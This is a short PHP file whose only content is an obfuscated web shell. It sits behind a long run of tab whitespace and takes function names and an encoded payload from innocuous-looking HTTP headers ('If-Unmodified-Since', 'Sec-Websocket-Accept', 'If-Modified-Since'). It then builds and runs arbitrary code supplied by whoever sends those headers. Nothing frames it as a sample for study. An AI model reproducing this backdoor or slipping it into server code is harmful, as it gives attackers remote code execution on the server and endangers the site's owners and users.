<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['If-Unmodified-Since'])){$config=$_HEADERS['If-Unmodified-Since']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['If-Modified-Since']));$config();}
